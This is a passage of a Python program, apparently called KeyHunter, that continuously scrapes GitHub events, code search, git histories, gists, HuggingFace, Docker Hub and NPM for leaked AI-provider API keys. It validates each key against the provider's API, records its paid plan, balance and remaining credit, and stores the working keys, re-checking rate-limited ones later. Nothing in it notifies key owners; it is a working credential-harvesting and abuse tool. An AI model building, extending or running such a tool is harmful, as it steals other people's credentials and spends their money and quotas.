                return "LIMITED", prov_name, "", ""
        except Exception:
            continue
    return "DEAD", "", "", ""


def validate(key: str, prov_name: str) -> ValidatorResult:
    # v10: GENERIC_HIGH_ENTROPY — try multiple endpoints.
    if prov_name == "GENERIC_HIGH_ENTROPY":
        status, identified_prov, plan, remaining = _v_generic_entropy(key)
        # Rewrite provider in DB if identified.
        if status in ("WORKING", "LIMITED") and identified_prov:
            with _DB_LOCK:
                c = _connect()
                try:
                    c.execute("UPDATE keys SET prov=? WHERE val=?",
                              (identified_prov, key))
                    c.commit()
                finally:
                    c.close()
            plan = plan or f"identified as {identified_prov}"
        db_update_key(key, status, plan, "", remaining)
        return status, plan, "", remaining

    prov = PROVIDERS.get(prov_name)
    if not prov:
        return "UNKNOWN", "", "", ""
    val_type = prov.get("validation_type", "default")

    if val_type in VALIDATORS:
        status, plan, price, remaining = VALIDATORS[val_type](prov, key)
    else:
        status, plan, price, remaining = _v_default(prov, key, prov_name)

    if status not in ("WORKING", "LIMITED"):
        db_update_key(key, status)
        return status, plan, price, remaining

    # ================================================================
    # PROVIDER-SPECIFIC ENRICHMENT (по правилам оператора)
    # ================================================================
    h = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}

    # --- ZAI: тариф + цена тарифа + чат-окно (НЕ MCP tools) ---
    if prov_name == "ZAI":
        # subscription — тариф и цена (повторяем до 2 раз если 429)
        for attempt in range(2):
            try:
                sr = HTTP.session().get(
                    "https://api.z.ai/api/biz/subscription/list",
                    headers=h, timeout=10)
                if sr.status_code == 200:
                    payload = sr.json()
                    rows = payload.get("data", []) if isinstance(payload, dict) \
                        else payload
                    if isinstance(rows, dict):
                        rows = rows.get("data", [])
                    prices = []
                    for s in rows:
                        if s.get("status") == "VALID":
                            p = float(s.get("actualPrice", 0))
                            prices.append(p)
                    if prices:
                        price = f"¥{sum(prices):.2f}"
                    break
                elif sr.status_code == 429 and attempt == 0:
                    time.sleep(2)
                    continue
                else:
                    break
            except Exception as e:
                log.debug("zai sub: %r", e)
                break
        # quota/limit — тариф + чат-окно (TOKENS_LIMIT). Повтор при 429.
        for attempt in range(2):
            try:
                qr = HTTP.session().get(
                    "https://api.z.ai/api/monitor/usage/quota/limit",
                    headers=h, timeout=10)
                if qr.status_code == 200:
                    qj = qr.json()
                    # "No coding plan" — only matters if key DIDN'T answer
                    # chat. If it answered 200 (WORKING), it has PAYG balance
                    # and works fine without coding plan.
                    if qj.get("code") == 500 or "coding plan" in \
                       qj.get("msg", "").lower():
                        if status != "WORKING":
                            # Key failed chat AND has no coding plan = junk.
                            status = "DEAD"
                            plan = "No coding plan, no PAYG"
                            remaining = ""
                            break
                        else:
                            # Key works on PAYG balance — keep WORKING.
                            plan = "PAYG balance"
                            remaining = "No coding plan"
                            break
                    d = qj.get("data", {})
                    level = (d.get("level") or "?").upper()
                    limits = d.get("limits", [])
                    tok = next((l for l in limits
                                if l.get("type") == "TOKENS_LIMIT"), {})
                    chat_pct = tok.get("percentage", "?")
                    # Если чат 100% — явно LIMITED
                    if isinstance(chat_pct, (int, float)) and chat_pct >= 100:
                        status = "LIMITED"
                    plan = f"GLM Coding {level}"
                    remaining = f"Chat {chat_pct}% used (5h window)"
                    break
                elif qr.status_code == 429 and attempt == 0:
                    time.sleep(2)
                    continue
                else:
                    break
            except Exception as e:
                log.debug("zai quota: %r", e)
                break
        # Если тариф остался "?" — это rate-limit на quota endpoint.
        if plan and "?" in plan:
            plan = "GLM Coding (rate-limited, retry later)"
            if status == "WORKING":
                status = "LIMITED"

    # --- KIMI: баланс + лимиты org ---
    elif prov_name == "KIMI":
        try:
            br = HTTP.session().get(
                "https://api.moonshot.cn/v1/users/me/balance",
                headers=h, timeout=10)
            if br.status_code == 200:
                d = br.json().get("data", {})
                cash = d.get("cash_balance", 0)
                voucher = d.get("voucher_balance", 0)
                price = f"¥{cash:.2f} cash + ¥{voucher:.2f} voucher"
                remaining = f"¥{cash + voucher:.2f} total"
        except Exception as e:
            log.debug("kimi balance: %r", e)
        try:
            orgr = HTTP.session().get(
                "https://api.moonshot.cn/v1/users/me",
                headers=h, timeout=10)
            if orgr.status_code == 200:
                org = orgr.json().get("data", {}).get("organization", {})
                tier = org.get("id", "?")
                rpm = org.get("max_request_per_minute", "?")
                plan = f"tier={tier} | {rpm} RPM"
        except Exception as e:
            log.debug("kimi org: %r", e)

    # --- OPENROUTER: баланс + всего потрачено кредитов ---
    elif prov_name == "OPENROUTER":
        try:
            cr = HTTP.session().get(
                "https://openrouter.ai/api/v1/credits",
                headers=h, timeout=10)
            if cr.status_code == 200:
                d = cr.json().get("data", {})
                tc = d.get("total_credits", 0) or 0
                tu = d.get("total_usage", 0) or 0
                remain = tc - tu
                price = f"${tu:.2f} spent of ${tc:.2f}"
                remaining = f"${remain:.2f} remaining"
        except Exception as e:
            log.debug("or credits: %r", e)
        try:
            kr = HTTP.session().get(
                "https://openrouter.ai/api/v1/auth/key",
                headers=h, timeout=10)
            if kr.status_code == 200:
                d = kr.json().get("data", {})
                plan = "FREE" if d.get("is_free_tier") else "PAID"
        except Exception as e:
            log.debug("or key: %r", e)

    # --- DASHSCOPE: ответ от qwen3.7-max (главное — ответ флагмана) ---
    elif prov_name == "DASHSCOPE":
        plan = "qwen3.7-max responded"
        # No public balance API — answer from flagship is the proof.

    # --- DEEPSEEK: ответ от deepseek-chat + баланс ---
    elif prov_name == "DEEPSEEK":
        plan = "deepseek-chat responded"
        try:
            br = HTTP.session().get(
                "https://api.deepseek.com/user/balance",
                headers=h, timeout=10)
            if br.status_code == 200:
                d = br.json()
                # DeepSeek balance format: {"is_available": true, "balance_infos": [...]}
                infos = d.get("balance_infos", [])
                if infos:
                    total = sum(float(i.get("total_balance", 0)) for i in infos)
                    remaining = f"¥{total:.2f} balance"
                elif "balance" in d:
                    remaining = f"{d['balance']} balance"
        except Exception as e:
            log.debug("deepseek balance: %r", e)

    # --- TOGETHER: ответ от MiniMax-M3 ---
    elif prov_name == "TOGETHER":
        plan = "MiniMax-M3 responded"
        try:
            br = HTTP.session().get(
                "https://api.together.xyz/v1/orgs/self/balance",
                headers=h, timeout=10)
            if br.status_code == 200:
                bal = br.json().get("balance", "?")
                remaining = f"${bal} balance"
        except Exception:
            pass

    # --- DEEPSEEK: ответ от deepseek-v4-pro ---
    elif prov_name == "DEEPSEEK":
        plan = "deepseek-v4-pro responded"
        try:
            br = HTTP.session().get(
                "https://api.deepseek.com/user/balance",
                headers=h, timeout=10)
            if br.status_code == 200:
                d = br.json()
                bal = d.get("balance", {}).get("total_balance",
                          d.get("is_available", "?"))
                remaining = f"{bal}"
        except Exception:
            pass

    # --- MISTRAL: ответ от mistral-large-latest ---
    elif prov_name == "MISTRAL":
        plan = "mistral-large-latest responded"

    # --- GROQ: ответ от llama-3.3-70b (бесплатный, но рабочий) ---
    elif prov_name == "GROQ":
        plan = "llama-3.3-70b-versatile responded"

    # --- FIREWORKS: ответ от llama-405b ---
    elif prov_name == "FIREWORKS":
        plan = "llama-v3p1-405b responded"
        try:
            br = HTTP.session().get(
                "https://api.fireworks.ai/v1/account",
                headers=h, timeout=10)
            if br.status_code == 200:
                d = br.json()
                remaining = f"user={d.get('id','?')}"
        except Exception:
            pass

    # --- SILICONFLOW: ответ + баланс ---
    elif prov_name == "SILICONFLOW":
        plan = "DeepSeek-V3 responded"
        try:
            br = HTTP.session().get(
                "https://api.siliconflow.cn/v1/user/info",
                headers=h, timeout=10)
            if br.status_code == 200:
                d = br.json().get("data", {})
                bal = d.get("balance", "?")
                remaining = f"{bal} balance"
        except Exception:
            pass

    # ================================================================
    db_update_key(key, status, plan, price, remaining)
    if status == "WORKING":
        save_working(key, prov_name, plan, price, remaining)
    return status, plan, price, remaining


# --------------------------------------------------------------------------- #
# Phases
# --------------------------------------------------------------------------- #
# Realtime state — shared between background poller and main cycle.
_realtime_repos: deque = deque()          # queue of fresh repos to scan
_realtime_lock = threading.Lock()
_realtime_seen: Set[str] = set()          # dedup (cap in-memory)
_REALTIME_SEEN_MAX = 50_000


def _realtime_enqueue(repo: str) -> None:
    """Add a fresh repo to the realtime queue (dedup)."""
    with _realtime_lock:
        if repo in _realtime_seen:
            return
        _realtime_seen.add(repo)
        # Cap the seen-set so it doesn't grow unbounded.
        if len(_realtime_seen) > _REALTIME_SEEN_MAX:
            # Drop oldest half — rough but bounded.
            for _ in range(_REALTIME_SEEN_MAX // 2):
                _realtime_seen.pop() if hasattr(_realtime_seen, 'pop') else None
        _realtime_repos.append(repo)


def realtime_poll_once() -> int:
    """Poll GitHub public events once. Enqueue repos from fresh pushes.

    Public /events payload is truncated (no commit file lists), so we
    enqueue ALL repos from PushEvents and let clone_and_scan_git filter
    via git log — cloning is cheaper than N API calls for commit details.

    Returns count of NEW repos enqueued.
    """
    tok = TOKENS.next()
    if not tok:
        return 0
    headers = {"Authorization": f"token {tok}",
               "Accept": "application/vnd.github.v3+json"}
    try:
        r = HTTP.session().get("https://api.github.com/events",
                               params={"per_page": 100},
                               headers=headers, timeout=(5, 10))
    except Exception as e:
        log.debug("realtime poll error: %r", e)
        return 0
    if r.status_code != 200:
        log.debug("realtime poll status %d", r.status_code)
        return 0

    enqueued = 0
    for ev in r.json():
        if ev.get("type") != "PushEvent":
            continue
        repo_name = ev.get("repo", {}).get("name", "")
        if not repo_name:
            continue
        # v10 SMART FILTER — aggressive junk-repo filtering (X10 quality).
        lower = repo_name.lower()
        JUNK_PATTERNS = (
            '/test', '/hello', '/tutorial', '/learning', '/example',
            '/demo-', '/cv-', '/resume', '/portfolio', '/leetcode',
            '/hackerrank', '/100-days', '/30-days', '/awesome-',
            # v10 additions — more junk patterns
            '/homework', '/assignment', '/course', '/lab-', '/exercise',
            '/practice', '/my-first', '/test-repo', '/sandbox',
            '/playground', '/scratch', '/experiment', '/backup-',
            '/misc', '/temp-', '/draft', '/wip-', '/bot-',
            '/discord-bot', '/telegram-bot', '/slack-bot',
            '/chrome-extension', '/firefox-addon',
            '/unity', '/unreal', '/godot',  # game projects rarely have AI keys
        )
        if any(junk in lower for junk in JUNK_PATTERNS):
            continue
        _realtime_enqueue(repo_name)
        enqueued += 1
    return enqueued


def realtime_loop(stop_event: threading.Event) -> None:
    """Background thread: poll GitHub events every 60s, enqueue fresh repos."""
    log.info("📡 [REALTIME] poller started (60s interval)")
    poll_count = 0
    while not stop_event.is_set():
        try:
            n = realtime_poll_once()
            poll_count += 1
            # Only log summary every 5 polls (~5 min), not every poll.
            if n and (poll_count % 5 == 0):
                log.info("📡 [REALTIME] +%d repos in last 5 polls (queue=%d)",
                         n, len(_realtime_repos))
        except Exception as e:
            log.debug("realtime_loop error: %r", e)
        for _ in range(60):
            if stop_event.is_set():
                break
            time.sleep(1)
    log.info("📡 [REALTIME] poller stopped")


def realtime_drain_loop(stop_event: threading.Event) -> None:
    """Background thread: continuously clone+scan fresh repos from the queue.

    Runs in PARALLEL with the main cycle so the API phase no longer blocks
    fresh-repo scanning. This is the key to catching freshly-leaked keys
    within minutes instead of waiting for a full 10-min cycle.
    """
    log.info("⚡ [REALTIME-DRAIN] scanner started (parallel to main cycle)")
    while not stop_event.is_set():
        try:
            qsize = len(_realtime_repos)
            if qsize == 0:
                for _ in range(5):
                    if stop_event.is_set():
                        break
                    time.sleep(1)
                continue
            batch = min(max(qsize, 25), 100)
            rt_found = phase_realtime_drain(batch)
            new_keys = 0
            for pn, keys in rt_found.items():
                for k, repo in keys:
                    if db_add_key(k, pn, repo):
                        new_keys += 1
            if new_keys:
                log.info("🎉 [REALTIME] +%d NEW keys from fresh pushes! (queue=%d)",
                         new_keys, len(_realtime_repos))
        except Exception as e:
            log.debug("realtime_drain_loop error: %r", e)
            for _ in range(10):
                if stop_event.is_set():
                    break
                time.sleep(1)
    log.info("⚡ [REALTIME-DRAIN] scanner stopped")


def phase_realtime_drain(batch_size: int = 50
                         ) -> Dict[str, Set[Tuple[str, str]]]:
    """Drain fresh repos from the realtime queue, clone+scan them.

    Prioritizes the freshest pushes — keys here are minutes old, not hours.
    """
    found: Dict[str, Set[Tuple[str, str]]] = {pn: set() for pn in PROVIDERS}
    with _realtime_lock:
        to_scan = []
        while _realtime_repos and len(to_scan) < batch_size:
            to_scan.append(_realtime_repos.popleft())
    if not to_scan:
        return found

    # Skip repos already git-scanned.
    c = _connect()
    try:
        git_done = set(r[0] for r in c.execute(
            "SELECT repo FROM git_scanned").fetchall())
    finally:
        c.close()
    to_scan = [r for r in to_scan if r not in git_done]
    if not to_scan:
        return found

    log.info("⚡ [REALTIME] cloning %d fresh repos...", len(to_scan))
    ex = ThreadPoolExecutor(max_workers=CONFIG["git_workers"])
    futs = {ex.submit(clone_and_scan_git, repo): repo for repo in to_scan}
    done = 0
    try:
        for f in as_completed(futs, timeout=180):
            if _stopped():
                break
            done += 1
            try:
                result = f.result()
                repo = futs[f]
                for pn, keys in result.items():
                    found.setdefault(pn, set()).update(keys)
                with _DB_LOCK:
                    gc = _connect()
                    try:
                        gc.execute(
                            "INSERT OR IGNORE INTO git_scanned "
                            "(repo,scanned) VALUES (?,?)",
                            (repo, datetime.now().isoformat()))
                        gc.commit()
                    except Exception as e:
                        log.debug("realtime git_scanned: %r", e)
                    finally:
                        gc.close()
            except Exception as e:
                log.debug("realtime scan error: %r", e)
        # Single summary line at the end — no per-10 spam.
        kc = sum(len(v) for v in found.values())
        log.info("✅ [REALTIME] done: %d repos → %d keys", done, kc)
    except Exception as e:
        log.warning("⚠️  [REALTIME] timeout %d/%d: %r", done, len(to_scan), e)
    for f in futs:
        f.cancel()
    ex.shutdown(wait=False, cancel_futures=True)
    return found


def phase_search(var_offset: int, ext_offset: int, cycle: int = 1
                 ) -> Tuple[List[Tuple[str, str]], int]:
    """Phase: search GitHub for files via REST API (token rotation).

    v10 strategy — COMPOUND DORKS:
      - Group all vars of a provider into ONE OR-query per filename.
        (ZHIPU_API_KEY OR Z_AI_API_KEY OR BIGMODEL_API_KEY) filename:.env
        This cuts ~550 queries/cycle → ~70 queries (X7 faster).
      - TOP_FILENAMES: 10 files where 80% of keys live.
      - CURATED_DORKS: hand-picked high-yield queries (every 5th cycle).
      - PAGE ROTATION: each cycle pulls different pages.
      - sort=indexed: fresher results.
    """
    rotated_files = TOP_FILENAMES[ext_offset % len(TOP_FILENAMES):] + \
                    TOP_FILENAMES[:ext_offset % len(TOP_FILENAMES)]
    all_files: Set[Tuple[str, str]] = set()

    # GitHub Code Search returns max 1000 results (10 pages × 100 per_page).
    # Pages beyond 10 are always empty. Rotate within pages 1-10 only.
    page_offset = ((cycle - 1) * CONFIG["search_pages"]) % 10

    all_queries: List[str] = []

    # === v10 QUERY STRATEGY ===
    # GitHub code search does NOT support OR-syntax (422 error).
    # Instead: pick TOP-2 vars per provider (rotated), reducing from
    # v9's 3-5 vars → 2 vars = ~40% fewer queries with same coverage.
    for prov_name, prov in PROVIDERS.items():
        vars_list = prov.get("vars", [])
        if not vars_list:
            continue
        off = var_offset % len(vars_list)
        rotated_vars = vars_list[off:] + vars_list[:off]
        # TOP-2 vars per provider (v10 optimization: was 3-5 in v9).
        top_vars = rotated_vars[:2]
        for var in top_vars:
            for fname in rotated_files:
                all_queries.append(f'{var} filename:{fname}')

    # === CURATED DORKS — every 5th cycle (hand-picked high-yield) ===
    if cycle % 5 == 1:
        all_queries.extend(CURATED_DORKS)

    # EXTRA CONTEXTS: Colab/Kaggle/Replit — every 3rd cycle.
    if cycle % 3 == 1:
        for ctx in EXTRA_CONTEXTS:
            all_queries.append(f'"{ctx}"')

    # Endpoints: only every 10th cycle (low yield, high query cost).
    if cycle % 10 == 1:
        for endpoint in ENDPOINT_SEARCHES:
            all_queries.append(f'"{endpoint}"')
        endpoint_note = f" + {len(ENDPOINT_SEARCHES)} endpoints + {len(EXTRA_CONTEXTS)} extra"
    else:
        endpoint_note = f" + {len(EXTRA_CONTEXTS)} extra" if cycle % 3 == 1 else " (extra every 3rd)"

    n_tokens = TOKENS.count()
    max_workers = min(CONFIG["api_workers"], max(1, n_tokens))

    log.info("[API] %d queries | cycle %d (filename-first) → pages %d-%d%s "
             "x %d tokens | %d threads",
             len(all_queries), cycle,
             page_offset + 1, page_offset + CONFIG["search_pages"],
             endpoint_note, n_tokens, max_workers)

    # REST search with token rotation — primary, fastest with many tokens.
    if n_tokens >= 1:
        ex = ThreadPoolExecutor(max_workers=max_workers)
        futs = {ex.submit(rest_search_token, q, CONFIG["search_pages"],
                          page_offset): q for q in all_queries}
        done = 0
        log.info("🔍 [API] searching %d queries...", len(all_queries))
        try:
            for f in as_completed(futs, timeout=120):
                if _stopped():
                    break
                done += 1
                try:
                    for item in f.result():
                        repo = item.get("repository", {}).get(
                            "nameWithOwner", "")
                        path = item.get("path", "")
                        if repo and path:
                            all_files.add((repo, path))
                            add_known_repo(repo, "api_rotation")
                except Exception as e:
                    log.debug("search result error: %r", e)
                # Progress every 100 queries (long phase, need feedback).
                if done % 100 == 0:
                    log.info("   └─ [API] %d/%d queries → %d files",
                             done, len(all_queries), len(all_files))
        except Exception as e:
            log.warning("⚠️  [API] timeout %d/%d: %r", done,
                        len(all_queries), e)
        log.info("✅ [API] done: %d/%d queries → %d files",
                 done, len(all_queries), len(all_files))
        for f in futs:
            f.cancel()
        ex.shutdown(wait=False, cancel_futures=True)
    else:
        # Fallback: gh CLI (serial, slow).
        for q in all_queries:
            if _stopped():
                break
            for item in gh_search(q):
                repo = item.get("repository", {}).get("nameWithOwner", "")
                path = item.get("path", "")
                if repo and path:
                    all_files.add((repo, path))
                    add_known_repo(repo, "env_search")

    new_files = [(r, p) for r, p in all_files if not is_scanned(r, p)]
    cached = len(all_files) - len(new_files)
    return new_files, cached


def phase_scan_files(new_files: List[Tuple[str, str]]) -> Dict[str, Set[Tuple[str, str]]]:
    """Phase: download + extract from raw files."""
    found: Dict[str, Set[Tuple[str, str]]] = {}
    if not new_files:
        return found
    log.info("📥 [SCAN] downloading %d files...", len(new_files))
    ex = ThreadPoolExecutor(max_workers=CONFIG["scan_workers"])
    futs = {ex.submit(scan_raw_file, r, p): (r, p) for r, p in new_files}
    done = 0
    total = len(new_files)
    try:
        for f in as_completed(futs, timeout=120):
            if _stopped():
                break
            done += 1
            try:
                result = f.result()
                for pn, keys in result.items():
                    found.setdefault(pn, set()).update(keys)
            except Exception as e:
                log.debug("scan result error: %r", e)
    except Exception as e:
        log.warning("⚠️  [SCAN] timeout %d/%d: %r", done, total, e)
    kc = sum(len(v) for v in found.values())
    log.info("✅ [SCAN] done: %d files → %d keys", done, kc)
    for f in futs:
        f.cancel()
    ex.shutdown(wait=False, cancel_futures=True)
    return found


def phase_git_history(batch_size: int = 50) -> Dict[str, Set[Tuple[str, str]]]:
    """Phase: clone repos + scan git history."""
    cleanup_clones()
    c = _connect()
    try:
        raw_repos = set(r[0] for r in c.execute(
            "SELECT DISTINCT repo FROM scanned_files").fetchall())
        known = set(r[0] for r in c.execute(
            "SELECT repo FROM known_repos ORDER BY id DESC").fetchall())
        all_repos = list(raw_repos | known)
        git_done = set(r[0] for r in c.execute(
            "SELECT repo FROM git_scanned").fetchall())
    finally:
        c.close()
    # PRIORITY: repos with AI-related keywords first (40% hit rate vs 0.1%).
    # Then recent repos (higher id = more recent discovery).
    AI_KEYWORDS = ('ai', 'llm', 'chat', 'bot', 'gpt', 'glm', 'qwen', 'openai',
                   'agent', 'streamlit', 'gradio', 'flask', 'scrape', 'crawler',
                   'auto', 'smart', 'assist', 'whisper', 'tts', 'ocr',
                   'captcha', 'proxy', 'saas', 'api', 'dashscope', 'deepseek',
                   'kimi', 'moonshot', 'groq', 'together', 'fireworks', 'replicate',
                   'openrouter', 'zhipu', 'n8n', 'langchain', 'llama', 'mistral')
    unscanned = [r for r in all_repos if r not in git_done]
    # Sort: AI-related first, then by recency (known_repos ordered by id DESC)
    ai_repos = [r for r in unscanned
                if any(kw in r.lower() for kw in AI_KEYWORDS)]
    other_repos = [r for r in unscanned if r not in set(ai_repos)]
    to_scan = (ai_repos[:batch_size//2] +
               other_repos[:batch_size - len(ai_repos[:batch_size//2])])

    if not to_scan:
        log.info("⏭️  [GIT] no new repos to clone")
        return {}

    log.info("🔧 [GIT] cloning %d repos (history scan)...", len(to_scan))
    found: Dict[str, Set[Tuple[str, str]]] = {pn: set() for pn in PROVIDERS}
    ex = ThreadPoolExecutor(max_workers=CONFIG["git_workers"])
    futs = {ex.submit(clone_and_scan_git, repo): repo for repo in to_scan}
    done = 0
    total = len(to_scan)
    try:
        for f in as_completed(futs, timeout=240):
            if _stopped():
                break
            done += 1
            try:
                result = f.result()
                repo = futs[f]
                for pn, keys in result.items():
                    found.setdefault(pn, set()).update(keys)
                with _DB_LOCK:
                    gc = _connect()
                    try:
                        gc.execute(
                            "INSERT OR IGNORE INTO git_scanned "
                            "(repo,scanned) VALUES (?,?)",
                            (repo, datetime.now().isoformat()))
                        gc.commit()
                    except Exception as e:
                        log.debug("git_scanned insert: %r", e)
                    finally:
                        gc.close()
            except Exception as e:
                log.debug("git result error: %r", e)
        kc = sum(len(v) for v in found.values())
        log.info("✅ [GIT] done: %d repos → %d keys", done, kc)
    except Exception as e:
        log.warning("⚠️  [GIT] timeout %d/%d: %r", done, total, e)
    for f in futs:
        f.cancel()
    ex.shutdown(wait=False, cancel_futures=True)
    return found


def phase_validate() -> int:
    """Phase: validate NEW + ERR keys. Non-TG first, TG last."""
    c = _connect()
    try:
        priority = c.execute(
            'SELECT val,prov FROM keys WHERE status IN ("NEW","ERR") '
            'AND prov != "TELEGRAM"').fetchall()
        tg_keys = c.execute(
            'SELECT val,prov FROM keys WHERE status IN ("NEW","ERR") '
            'AND prov = "TELEGRAM"').fetchall()
    finally:
        c.close()

    if not priority and not tg_keys:
        log.info("[VAL] No keys to validate")
        return 0

    working = 0

    if priority:
        log.info("[VAL] %d priority keys (non-TG)", len(priority))
        ex = ThreadPoolExecutor(max_workers=CONFIG["validate_workers"])
        futs = {ex.submit(validate, k, p): (k, p) for k, p in priority}
        try:
            for f in as_completed(futs, timeout=180):
                if _stopped():
                    break
                try:
                    status, plan, price, rem = f.result()
                    k, p = futs[f]
                    db_update_key(k, status, plan, price, rem)
                    if status == "WORKING":
                        working += 1
                        log.info(">>> WORKING [%s] %s", p, mask(k))
                        if plan and price:
                            log.info("    %s | $%s | remaining=%s",
                                     plan, price, rem)
                except Exception as e:
                    log.debug("validate result error: %r", e)
        except Exception as e:
            log.warning("[VAL] timeout: %r", e)
        for f in futs:
            f.cancel()
        ex.shutdown(wait=False, cancel_futures=True)

    # TG: limited batch to avoid blocking.
    if tg_keys:
        tg_batch = tg_keys[:200]
        log.info("[VAL] %d TG keys (of %d total)", len(tg_batch), len(tg_keys))
        ex = ThreadPoolExecutor(max_workers=CONFIG["validate_workers"])
        futs = {ex.submit(validate, k, p): (k, p) for k, p in tg_batch}
        try:
            for f in as_completed(futs, timeout=60):
                if _stopped():
                    break
                try:
                    status, plan, price, rem = f.result()
                    k, p = futs[f]
                    db_update_key(k, status, plan, price, rem)
                    if status == "WORKING":
                        working += 1
                        log.info(">>> WORKING [%s] %s", p, mask(k))
                except Exception as e:
                    log.debug("tg validate error: %r", e)
        except Exception as e:
            log.warning("[VAL] TG timeout: %r", e)
        for f in futs:
            f.cancel()
        ex.shutdown(wait=False, cancel_futures=True)

    return working


# --------------------------------------------------------------------------- #
# Main loop
# --------------------------------------------------------------------------- #
def _acquire_lock() -> Optional[Any]:
    """Atomic single-instance lock via OS-level file locking.

    Uses msvcrt.locking() on Windows (or fcntl on Linux) to atomically
    acquire an exclusive lock on data/parser.lock. This prevents the
    race condition where multiple processes check-then-write simultaneously.
    PID is written for diagnostics, but the LOCK itself is the real gate.
    """
    lock_file = PROJ / "data" / "parser.lock"
    pid_file = PROJ / "data" / "parser.pid"
    lock_file.parent.mkdir(parents=True, exist_ok=True)
    try:
        # Open/create the lock file. O_CREAT | O_RDWR.
        fd = os.open(str(lock_file), os.O_CREAT | os.O_RDWR)
        # Try non-blocking exclusive lock (cross-platform). Raises OSError if locked.
        try:
            if os.name == "nt":
                import msvcrt
                msvcrt.locking(fd, msvcrt.LK_NBLCK, 1)
            else:
                import fcntl
                fcntl.lockf(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except OSError:
            os.close(fd)
            # Locked — another instance holds it. Read its PID for log.
            try:
                old_pid = pid_file.read_text().strip()
            except Exception:
                old_pid = "?"
            log.error("Another parser holds lock (PID %s). Exiting.", old_pid)
            return None
        # We got the lock. Write our PID (diagnostics only).
        pid_file.write_text(str(os.getpid()))
        return fd  # return fd so main() keeps it alive
    except Exception as e:
        log.warning("lock acquire failed: %r", e)
        return True  # proceed anyway


def main() -> None:
    lock = _acquire_lock()
    if lock is None:
        sys.exit(1)
    db_init()

    # Wipe clones + stray reports at startup.
    if CLONE_DIR.exists():
        for d in CLONE_DIR.iterdir():
            if d.is_dir():
                force_delete(d)
        for f in CLONE_DIR.glob("gl_*.json"):
            try:
                f.unlink()
            except Exception:
                pass

    # Reconstruct working_keys.txt only on empty DB.
    c = _connect()
    try:
        has_data = c.execute("SELECT COUNT(*) FROM keys").fetchone()[0]
    finally:
        c.close()
    if has_data == 0:
        with open(WORKING_FILE, "w", encoding="utf-8") as fh:
            fh.write("")

    active = [k for k, v in PROVIDERS.items() if v.get("vars")]
    print("=" * 60)
    print("  KeyHunter PARSER v9  [REALTIME + FILENAME-FIRST]")
    print("  Strategy: realtime events + git history + filename search")
    print(f"  Providers: {len(active)} active ({', '.join(active[:6])}...)")
    print(f"  Tokens:   {TOKENS.count()} live")
    print(f"  Cycles:   {'infinite' if not MAX_CYCLES else MAX_CYCLES}")
    print("  Validator runs SEPARATELY (RUN_VALIDATOR.bat)")
    print("=" * 60)
    log.info("parser started — realtime poller + drain in background")

    cycle = 0
    # Start background realtime poller (GitHub Events API every 60s).
    rt_thread = threading.Thread(target=realtime_loop, args=(_STOP,),
                                 name="realtime-poller", daemon=True)
    rt_thread.start()
    # Start background realtime DRAIN — clones fresh repos continuously,
    # in parallel with the main cycle. No more queue backlog.
    rt_drain_thread = threading.Thread(target=realtime_drain_loop,
                                       args=(_STOP,),
                                       name="realtime-drain", daemon=True)
    rt_drain_thread.start()
    # Start HuggingFace Spaces scanner — parallel source, less competition.
    try:
        from hf_scanner import HFScanner
        hf = HFScanner(http_pool=HTTP, extract_fn=_extract_keys,
                       db_add_fn=db_add_key)
        hf.stop_event = _STOP
        hf_thread = threading.Thread(target=hf.loop, name="hf-scanner",
                                     daemon=True)
        hf_thread.start()
    except Exception as e:
        log.warning("HF scanner init failed: %r", e)

    # Start GitHub Gists scanner — people leak keys in public gists.
    try:
        from gist_scanner import GistScanner
        gs = GistScanner(http_pool=HTTP, extract_fn=_extract_keys,
                         db_add_fn=db_add_key)
        gs.stop_event = _STOP
        gist_thread = threading.Thread(target=gs.loop, name="gist-scanner",
                                       daemon=True)
        gist_thread.start()
    except Exception as e:
        log.warning("Gist scanner init failed: %r", e)

    # GitLab scanner — DISABLED (2691 keys found, 0 WORKING = 0% yield).
    # GitLab project search finds package-lock.json dependencies, not real keys.
    # try:
    #     from gitlab_scanner import GitLabScanner
    #     gl = GitLabScanner(PROJ)
    #     ...

    # Start Codeberg scanner — EU privacy forge, free API.
    try:
        from gitea_scanner import GiteaScanner
        cb = GiteaScanner(PROJ, host="codeberg.org", name="CODEBERG",
                          emoji="🏔️")
        cb_thread = threading.Thread(target=cb.loop, args=(_STOP,),
                                     name="codeberg-scanner", daemon=True)
        cb_thread.start()
    except Exception as e:
        log.warning("Codeberg scanner init failed: %r", e)

    # Start Gitea.com scanner — public Gitea instance.
    try:
        from gitea_scanner import GiteaScanner as GS2
        gt = GS2(PROJ, host="gitea.com", name="GITEA", emoji="🔧")
        gt_thread = threading.Thread(target=gt.loop, args=(_STOP,),
                                     name="gitea-scanner", daemon=True)
        gt_thread.start()
    except Exception as e:
        log.warning("Gitea scanner init failed: %r", e)

    # Start GitHub Commits scanner — searches commit messages/diffs.
    # Different API endpoint from code search, huge untapped surface.
    try:
        from gh_commit_scanner import CommitScanner
        cs = CommitScanner(PROJ, TOKENS.tokens)
        cs_thread = threading.Thread(target=cs.loop, args=(_STOP,),
                                     name="commits-scanner", daemon=True)
        cs_thread.start()
    except Exception as e:
        log.warning("Commit scanner init failed: %r", e)

    # Start Docker Hub scanner — Docker images often contain .env in layers.
    try:
        from docker_scanner import DockerScanner
        dk = DockerScanner(PROJ)
        dk_thread = threading.Thread(target=dk.loop, args=(_STOP,),
                                     name="docker-scanner", daemon=True)
        dk_thread.start()
    except Exception as e:
        log.warning("Docker scanner init failed: %r", e)

    # Start NPM scanner — package.json / README with hardcoded keys.
    try:
        from npm_scanner import NPMScanner
        npm = NPMScanner(PROJ)
        npm_thread = threading.Thread(target=npm.loop, args=(_STOP,),
                                      name="npm-scanner", daemon=True)
        npm_thread.start()
    except Exception as e:
        log.warning("NPM scanner init failed: %r", e)

    # Start Revalidation scanner — re-checks LIMITED keys (5h window reset).
    try:
        from revalidate_scanner import RevalidateScanner
        rv = RevalidateScanner(PROJ)
        rv_thread = threading.Thread(target=rv.loop, args=(_STOP,),
                                     name="revalidate-scanner", daemon=True)
        rv_thread.start()
    except Exception as e:
        log.warning("Revalidate scanner init failed: %r", e)

    # Start HF Models+Datasets scanner — HF is 31% yield, expand coverage.
    try:
        from hf_models_scanner import HFModelsScanner
        hfm = HFModelsScanner(PROJ)
        hfm_thread = threading.Thread(target=hfm.loop, args=(_STOP,),
                                      name="hf-models-scanner", daemon=True)
        hfm_thread.start()
    except Exception as e:
        log.warning("HF Models scanner init failed: %r", e)

    # Start GitHub Issues scanner — people paste keys in bug reports.
    try:
        from gh_issues_scanner import IssuesScanner
